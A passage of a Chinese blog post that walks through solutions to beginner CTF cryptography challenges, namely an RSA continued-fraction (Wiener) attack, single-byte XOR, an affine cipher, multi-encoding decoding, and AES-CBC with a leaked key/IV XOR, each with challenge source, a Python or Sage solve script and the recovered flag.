     </span><span class="katex-html"><span class="base"><span class="strut" style="height: 2.0074em; vertical-align: -0.686em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 1.3214em;"><span class="" style="top: -2.314em;"><span class="pstrut" style="height: 3em;"></span><span class="mord"><span class="mord">3</span></span></span><span class="" style="top: -3.23em;"><span class="pstrut" style="height: 3em;"></span><span class="frac-line" style="border-bottom-width: 0.04em;"></span></span><span class="" style="top: -3.677em;"><span class="pstrut" style="height: 3em;"></span><span class="mord"><span class="mord">7</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.686em;"><span class=""></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></span></span></p> 
<p>同理带入到我们要解决的问题中 我们想要获得的k和d 就存在这其中一次的结果中</p> 
<p>所以对每组进行尝试即可</p> 
<p>简易版exp：</p> 
<pre><code class="prism language-python"><span class="token comment">#sage</span>
e <span class="token operator">=</span> <span class="token number">8614531087131806536072176126608505396485998912193090420094510792595101158240453985055053653848556325011409922394711124558383619830290017950912353027270400567568622816245822324422993074690183971093882640779808546479195604743230137113293752897968332220989640710311998150108315298333817030634179487075421403617790823560886688860928133117536724977888683732478708628314857313700596522339509581915323452695136877802816003353853220986492007970183551041303875958750496892867954477510966708935358534322867404860267180294538231734184176727805289746004999969923736528783436876728104351783351879340959568183101515294393048651825</span>
n <span class="token operator">=</span> <span class="token number">19873634983456087520110552277450497529248494581902299327237268030756398057752510103012336452522030173329321726779935832106030157682672262548076895370443461558851584951681093787821035488952691034250115440441807557595256984719995983158595843451037546929918777883675020571945533922321514120075488490479009468943286990002735169371404973284096869826357659027627815888558391520276866122370551115223282637855894202170474955274129276356625364663165723431215981184996513023372433862053624792195361271141451880123090158644095287045862204954829998614717677163841391272754122687961264723993880239407106030370047794145123292991433</span>
cf <span class="token operator">=</span> continued_fraction<span class="token punctuation">(</span>e<span class="token operator">/</span>n<span class="token punctuation">)</span>
<span class="token comment"># print(cf)</span>
convergents <span class="token operator">=</span> cf<span class="token punctuation">.</span>convergents<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token comment"># print(convergents)</span>
reald <span class="token operator">=</span> <span class="token number">1</span>
<span class="token keyword">for</span> kd <span class="token keyword">in</span> convergents<span class="token punctuation">:</span>
    k <span class="token operator">=</span> kd<span class="token punctuation">.</span>numerator<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">#获取分子</span>
    d <span class="token operator">=</span> kd<span class="token punctuation">.</span>denominator<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">#获取分母</span>
    <span class="token keyword">if</span> <span class="token builtin">pow</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span>e<span class="token operator">*</span>d<span class="token punctuation">,</span>n<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">2</span><span class="token punctuation">:</span> <span class="token comment">#判断我们的d能否在这个加密体系中对2加密之后成功还原为2 还原成功则证明解密正确</span>
        reald <span class="token operator">=</span> d
        <span class="token keyword">print</span><span class="token punctuation">(</span>d<span class="token punctuation">)</span>
        <span class="token keyword">break</span>
c <span class="token operator">=</span> <span class="token number">6755916696778185952300108824880341673727005249517850628424982499865744864158808968764135637141068930913626093598728925195859592078242679206690525678584698906782028671968557701271591419982370839581872779561897896707128815668722609285484978303216863236997021197576337940204757331749701872808443246927772977500576853559531421931943600185923610329322219591977644573509755483679059951426686170296018798771243136530651597181988040668586240449099412301454312937065604961224359235038190145852108473520413909014198600434679037524165523422401364208450631557380207996597981309168360160658308982745545442756884931141501387954248</span>
<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>long_to_bytes<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span><span class="token builtin">pow</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span>d<span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token comment">#2357048593</span>
<span class="token comment">#b'flag{learn_some_continued_fraction_technique#dc16885c}'</span>
</code></pre> 
<h4><a id="Baby_xor_494"></a>Baby_xor</h4> 
<h5><a id="_496"></a>考点：异或</h5> 
<p>源码：</p> 
<pre><code class="prism language-python"><span class="token keyword">from</span> secret <span class="token keyword">import</span> <span class="token operator">*</span>

ciphertext <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>

<span class="token keyword">for</span> f <span class="token keyword">in</span> flag<span class="token punctuation">:</span>
    ciphertext<span class="token punctuation">.</span>append<span class="token punctuation">(</span>f <span class="token operator">^</span> key<span class="token punctuation">)</span>

<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">bytes</span><span class="token punctuation">(</span>ciphertext<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token comment"># e9e3eee8f4f7bffdd0bebad0fcf6e2e2bcfbfdf6d0eee1ebd0eabbf5f6aeaeaeaeaeaef2</span>
</code></pre> 
<p>真服 一个简单的异或把我难住了 去cryptohack怒刷xor题目</p> 
<pre><code class="prism language-python">flag <span class="token operator">=</span> <span class="token string">"e9e3eee8f4f7bffdd0bebad0fcf6e2e2bcfbfdf6d0eee1ebd0eabbf5f6aeaeaeaeaeaef2"</span>
flag <span class="token operator">=</span> <span class="token builtin">bytes</span><span class="token punctuation">.</span>fromhex<span class="token punctuation">(</span>flag<span class="token punctuation">)</span>
<span class="token keyword">from</span> pwn <span class="token keyword">import</span> xor
<span class="token comment">#相当于对key进行暴力猜测</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> <span class="token string">b'f'</span> <span class="token keyword">or</span> <span class="token string">b'F'</span> <span class="token keyword">in</span> xor<span class="token punctuation">(</span>flag<span class="token punctuation">,</span>i<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>xor<span class="token punctuation">(</span>flag<span class="token punctuation">,</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token comment">#flag{x0r_15_symm3try_and_e4zy!!!!!!}</span>
</code></pre> 
<h4><a id="Affine_527"></a>Affine</h4> 
<h5><a id="_529"></a>考点：仿射密码</h5> 
<p>源码：</p> 
<pre><code class="prism language-python"><span class="token keyword">from</span> flag <span class="token keyword">import</span> flag<span class="token punctuation">,</span> key

modulus <span class="token operator">=</span> <span class="token number">256</span>

ciphertext <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>

<span class="token keyword">for</span> f <span class="token keyword">in</span> flag<span class="token punctuation">:</span>
    ciphertext<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token punctuation">(</span>key<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">*</span>f <span class="token operator">+</span> key<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">%</span> modulus<span class="token punctuation">)</span>

<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">bytes</span><span class="token punctuation">(</span>ciphertext<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token comment"># dd4388ee428bdddd5865cc66aa5887ffcca966109c66edcca920667a88312064</span>
</code></pre> 
<p>很明显在加密程序中存在两个位置量 key[0] 和 key[1] 作为密钥a和b</p> 
<p>其实仿射密码的本质还是解方程得到a和b</p> 
<p>关于仿射密码参考：https://blog.csdn.net/jayq1/article/details/130474510?spm=1001.2014.3001.5501</p> 
<p>利用部分已知明文<code>flag{*****} </code> 获得a和b的值</p> 
<p>注意避坑！！！！</p> 
<p>使用f和l这两个已知字符无法合适求解 一定要灵活 整体往后取一位用l和a求解就好了</p> 
<p>完整exp：</p> 
<pre><code class="prism language-python"><span class="token keyword">import</span> gmpy2

<span class="token comment">#key = '****CENSORED***************'    #密钥 censored 被遮盖</span>
flag <span class="token operator">=</span> <span class="token string">'flag{*******CENSORED********}'</span>    <span class="token comment">#部分明文</span>

data <span class="token operator">=</span> <span class="token string">"dd4388ee428bdddd5865cc66aa5887ffcca966109c66edcca920667a88312064"</span>   <span class="token comment">#密文待解密</span>

encrypted <span class="token operator">=</span> <span class="token builtin">bytes</span><span class="token punctuation">.</span>fromhex<span class="token punctuation">(</span>data<span class="token punctuation">)</span> 
<span class="token comment"># encrypted = data</span>
<span class="token comment"># print(encrypted)</span>
plaindelta <span class="token operator">=</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>flag<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>flag<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>plaindelta<span class="token punctuation">)</span>
cipherdalte <span class="token operator">=</span> encrypted<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">-</span> encrypted<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>cipherdalte<span class="token punctuation">)</span>

modulus <span class="token operator">=</span> <span class="token number">256</span>
a <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>plaindelta<span class="token punctuation">,</span> modulus<span class="token punctuation">)</span> <span class="token operator">*</span> cipherdalte <span class="token operator">%</span> modulus
b <span class="token operator">=</span> <span class="token punctuation">(</span>encrypted<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">-</span> a <span class="token operator">*</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>flag<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">%</span> modulus
<span class="token keyword">print</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span>b<span class="token punctuation">)</span>
<span class="token comment"># a = 17</span>
<span class="token comment"># b = 23</span>
a_inv <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>a<span class="token punctuation">,</span> modulus<span class="token punctuation">)</span>
result <span class="token operator">=</span> <span class="token string">""</span>
<span class="token keyword">for</span> c <span class="token keyword">in</span> encrypted<span class="token punctuation">:</span>
    result <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token punctuation">(</span>c <span class="token operator">-</span> b<span class="token punctuation">)</span> <span class="token operator">*</span> a_inv <span class="token operator">%</span> modulus<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span>
<span class="token comment">#flag{4ff1ne_c1pher_i5_very_3azy}</span>

<span class="token comment">#------------------算法解释--------------------------</span>

<span class="token comment"># #对密文进行操作</span>
<span class="token comment"># # range(0,len(cip),2)：生成一个从 0 开始、以 2 为步长、不超过 data 长度的整数序列。这个序列中的每一个整数 i，都是 data 中两个字符的起始位置。</span>

<span class="token comment"># # data[i:i+2]：对于这个序列中的每一个整数 i，取 data 中从 i 开始、长度为 2 的子串。这样就可以把 data 中的所有字符两两分组。</span>

<span class="token comment"># # int(data[i:i+2],16)：对于这个子串，使用 int 函数将其转换为一个 16 进制的整数。</span>

<span class="token comment"># # for i in range(0,len(data),2)：将上述操作应用到 range 函数生成的整数序列中的每一个整数 i，得到一个整数列表。</span>

<span class="token comment"># # 最终的结果就是 encrypted 列表，它包含了 data 中所有字符两两分组后转换成的 16 进制整数。例如，如果 data 是字符串 "805eed80cbbccb94c36413275780ec94a857dfec8da8ca94a8c313a8ccf9"，则 encrypted 是一个整数列表，它的值为 [128, 94, 237, 128, 203, 188, 185, 76, 195, 100, 19, 39, 87, 128, 236, 148, 168, 87, 223, 236, 141, 168, 202, 148, 168, 195, 19, 168, 204, 249]。</span>


<span class="token comment"># #去计算密钥key</span>
<span class="token comment"># print(encrypted[0])</span>
<span class="token comment"># plaindelta = (ord(flag[1]) - ord(flag[0]))      #提取部分已知明文</span>
<span class="token comment"># cipherdalte = (encrypted[1] - encrypted[0])     #提取已知密文</span>
<span class="token comment"># print(cipherdalte)</span>
<span class="token comment"># #原来的加密公式</span>
<span class="token comment"># #y1 = (a * x1 + b) (mod 256)</span>
<span class="token comment"># #y2 = (a * x2 + b) (mod 256)</span>
<span class="token comment"># #故有</span>
<span class="token comment"># #y1 - y2 = a*(x1-x2)(mod 256) </span>

<span class="token comment"># #想要求a  </span>
<span class="token comment"># #即为</span>
<span class="token comment"># #plaindelta = x1-x2</span>
<span class="token comment"># #cipherdalta = y1-y2</span>
<span class="token comment"># #cipherdalte = a * plaindelta(mod 256)    ！！取模只是让最后的结果在0~251范围之间！！</span>
<span class="token comment"># #计算公式中的a，引入初等数论里面的内容</span>
<span class="token comment"># #ci = a * p % 256</span>
<span class="token comment"># #ci / p = a % 256</span>
<span class="token comment"># #在初等数论中 除相当于乘逆元</span>
<span class="token comment"># #故 ci * invert（p，256）= a （% 256） </span>
<span class="token comment"># #所以%251只是一个对于整体结果的一个限制，在公式推到的时候可以忽略存在</span>

<span class="token comment"># a = gmpy2.invert(plaindelta, 257) * cipherdalte %256    #数据全部放在0~251之间</span>
<span class="token comment"># #通过a计算b</span>
<span class="token comment"># b = (encrypted[0] - a * ord(flag[0]))  %256    #数据全部放在0~251之间</span>

<span class="token comment"># a_inv = gmpy2.invert(a, 257)</span>
<span class="token comment"># result = ""</span>
<span class="token comment"># for c in encrypted:</span>
<span class="token comment">#     result += chr(((c-b) * a_inv) % 256)</span>
<span class="token comment"># print(result)</span>
</code></pre> 
<h4><a id="BabyEncoding_641"></a>BabyEncoding</h4> 
<pre><code class="prism language-txt">part 1 of flag: ZmxhZ3tkYXp6bGluZ19lbmNvZGluZyM0ZTBhZDQ=  flag{dazzling_encoding#4e0ad4f0ca08d1e1d0f10c0c7afe422fea7c55192c992036ef623372601ff3a}
part 2 of flag: MYYGGYJQHBSDCZJRMQYGMMJQMMYGGN3BMZSTIMRSMZSWCNY=
part 3 of flag: =8S4U,3DR8SDY,C`S-F5F-C(S,S&lt;R-C`Q9F8S87T` 
</code></pre> 
<p>前两部分赛博厨子直接出</p> 
<p>最后一个部分采用Unencode编码 去使用bugku的工具https://ctf.bugku.com/tools</p> 
<h4><a id="babyaes_653"></a>babyaes</h4> 
<h5><a id="_aescbc_655"></a>考点：异或 aes中cbc模式</h5> 
<p>emm怎么讲嘞 虽然这个题叫做aes 但是真实的考点还是想考查大家的异或能力</p> 
<p>附上源码：</p> 
<pre><code class="prism language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Cipher <span class="token keyword">import</span> AES
<span class="token keyword">import</span> os
<span class="token keyword">from</span> flag <span class="token keyword">import</span> flag
<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span>


<span class="token keyword">def</span> <span class="token function">pad</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> data <span class="token operator">+</span> <span class="token string">b""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">b'\x00'</span> <span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">16</span> <span class="token operator">-</span> <span class="token builtin">len</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    flag_ <span class="token operator">=</span> pad<span class="token punctuation">(</span>flag<span class="token punctuation">)</span>
    key <span class="token operator">=</span> os<span class="token punctuation">.</span>urandom<span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">2</span> <span class="token comment">#32字节</span>
    iv <span class="token operator">=</span> os<span class="token punctuation">.</span>urandom<span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span> <span class="token comment">#16字节</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>bytes_to_long<span class="token punctuation">(</span>key<span class="token punctuation">)</span> <span class="token operator">^</span> bytes_to_long<span class="token punctuation">(</span>iv<span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token number">1</span><span class="token punctuation">)</span>
    aes <span class="token operator">=</span> AES<span class="token punctuation">.</span>new<span class="token punctuation">(</span>key<span class="token punctuation">,</span> AES<span class="token punctuation">.</span>MODE_CBC<span class="token punctuation">,</span> iv<span class="token punctuation">)</span>
    enc_flag <span class="token operator">=</span> aes<span class="token punctuation">.</span>encrypt<span class="token punctuation">(</span>flag_<span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>enc_flag<span class="token punctuation">)</span>


<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>
    main<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token comment"># 3657491768215750635844958060963805125333761387746954618540958489914964573229</span>
<span class="token comment"># b'&gt;]\xc1\xe5\x82/\x02\x7ft\xf1B\x8d\n\xc1\x95i'</span>
</code></pre> 
<p>先带大家分析一下这个题目啊，首先是因为要进行cbc的块加密模式嘛，所以把flag进行pad操作，如果不满足16位就在后面填充<code>\x00</code></p> 
<p>然后获得key和iv：</p> 
<p><code>key</code> : 随机生成加密的16个字节 重复2次 拼接</p> 
<p><code>iv</code> : 随机生成加密的16个字节</p> 
<p>然后利用到异或的知识对泄露的内容进行利用：</p> 
<p>首先将泄露的数据与1异或 就会得到key和iv的异或值</p> 
<p>然后我们在编码体系中看一下<code>bytes_to_long</code> 和 <code>long_to_bytes</code> 函数的实现方法</p> 
<p>都是针对单一字节独自操作的 就是对整体没有影响</p> 
<p>然后我们写一个小demo测试一下当两个不等位的数据进行异或的对齐方式：</p> 
<pre><code class="prism language-python">test1 <span class="token operator">=</span> <span class="token number">0b1110011</span>
test2 <span class="token operator">=</span> <span class="token number">0b11</span>
<span class="token comment"># print(bin(test1 ^ test2)) </span>
<span class="token comment">#0b1110000    #结果显示是低位对齐进行异或</span>
</code></pre> 
<p>所以key和iv进行异或 因为key是iv的两倍 所以对于key的高16位字节没有影响</p> 
<p>所以我们就可以直接得到key的组成：</p> 
<pre><code class="prism language-python">key <span class="token operator">=</span> long_to_bytes<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token operator">*</span><span class="token number">2</span>
</code></pre> 
<p>然后将<code>key ^ (key ^ iv) = iv</code></p> 
<p>完整exp：</p> 
<pre><code class="prism language-python"><span class="token keyword">import</span> os
<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Cipher <span class="token keyword">import</span> AES

data <span class="token operator">=</span> <span class="token number">3657491768215750635844958060963805125333761387746954618540958489914964573229</span>
data <span class="token operator">=</span> data <span class="token operator">^</span> <span class="token number">1</span>

key <span class="token operator">=</span> long_to_bytes<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token operator">*</span><span class="token number">2</span>
iv <span class="token operator">=</span> bytes_to_long<span class="token punctuation">(</span>key<span class="token punctuation">)</span> <span class="token operator">^</span> data
iv <span class="token operator">=</span> long_to_bytes<span class="token punctuation">(</span>iv<span class="token punctuation">)</span>

aes <span class="token operator">=</span> AES<span class="token punctuation">.</span>new<span class="token punctuation">(</span>key<span class="token punctuation">,</span> AES<span class="token punctuation">.</span>MODE_CBC<span class="token punctuation">,</span> iv<span class="token punctuation">)</span>
c <span class="token operator">=</span> <span class="token string">b'&gt;]\xc1\xe5\x82/\x02\x7ft\xf1B\x8d\n\xc1\x95i'</span>
dec_flag <span class="token operator">=</span> aes<span class="token punctuation">.</span>decrypt<span class="token punctuation">(</span>c<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token builtin">len</span><span class="token punctuation">(</span>iv<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"flag="</span><span class="token punctuation">,</span>dec_flag<span class="token punctuation">)</span>
<span class="token comment">#flag= b'firsT_cry_Aes\x00\x00\x00'</span>
</code></pre> 
<p><strong>我是哈皮，祝您每天嗨皮！我们下期再见~</strong></p>
                </div>
		</div>
		<div id="gabottom"></div>
	</article>
</main>


<nav class="pager flex">
	<div class="pager__item pager__item--prev">
		<a class="pager__link" href="/posts/6bb3067a2e52d25939b5c5cebc25acfb/" rel="prev">
			<span class="pager__subtitle">«&thinsp;Previous</span>
			<p class="pager__title">恐怖，ChatGPT 王炸级更新，到底有多厉害</p>
		</a>
	</div>
	<div class="pager__item pager__item--next">
		<a class="pager__link" href="/posts/6499cc2e7cb3daaf2861d054ecf54b87/" rel="next">
			<span class="pager__subtitle">Next&thinsp;»</span>
			<p class="pager__title">最小生成树</p>
		</a>
	</div>
</nav>


			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 编程大白的博客.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<div id="gafoot"></div>
<script src="https://101121.xyz/ga/app.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>